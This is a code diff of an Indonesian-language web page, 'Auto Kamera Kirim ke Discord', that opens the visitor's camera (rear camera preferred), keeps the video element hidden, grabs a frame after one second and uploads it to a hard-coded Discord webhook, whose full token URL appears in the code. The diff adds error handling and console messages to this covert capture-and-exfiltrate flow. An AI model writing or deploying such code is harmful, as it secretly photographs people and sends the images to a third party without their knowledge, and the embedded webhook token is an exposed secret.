@@ -4,26 +4,35 @@
   <title>Auto Kamera Kirim ke Discord</title>
 </head>
 <body>
-  <video id="video" autoplay playsinline muted width="320" height="240" style="display:none;"></video>
+  <video id="video" autoplay playsinline muted width="320" height="240" style="visibility:hidden; position:absolute;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
+
   <script>
     async function startCameraAndSend() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: "environment" } } // Kamera belakang jika tersedia
+        });
+
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         video.srcObject = stream;
 
-        video.onloadedmetadata = () => {
-          // Tunggu 1 detik supaya kamera sempat aktif
+        video.onloadeddata = () => {
           setTimeout(() => {
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
+
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob((blob) => {
-              const webhookURL = "https://discord.com/api/webhooks/1362791961437933739/XtSJE6yIX3oZIzgA9whNdLddUCSAxkj9VFgfjWfjVjopdKkTcQxp0HlybawvzIA1TaWl"; // ganti dengan milikmu
+              if (!blob) {
+                console.error("Gagal membuat blob dari canvas.");
+                return;
+              }
+
+              const webhookURL = "https://discord.com/api/webhooks/1362791961437933739/XtSJE6yIX3oZIzgA9whNdLddUCSAxkj9VFgfjWfjVjopdKkTcQxp0HlybawvzIA1TaWl"; // Ganti dengan webhook kamu
               const formData = new FormData();
               formData.append("file", blob, "cuplikan.png");
 
@@ -31,10 +40,12 @@
                 method: "POST",
                 body: formData
               }).then(response => {
-                console.log(response.ok ? "Terkirim" : "Gagal mengirim");
+                console.log(response.ok ? "✅ Gambar terkirim ke Discord!" : "❌ Gagal mengirim ke Discord");
+              }).catch(error => {
+                console.error("Fetch error:", error);
               });
             }, 'image/png');
-          }, 1000);
+          }, 1000); // Tunggu 1 detik supaya frame siap
         };
       } catch (err) {
         console.error("Gagal akses kamera:", err);
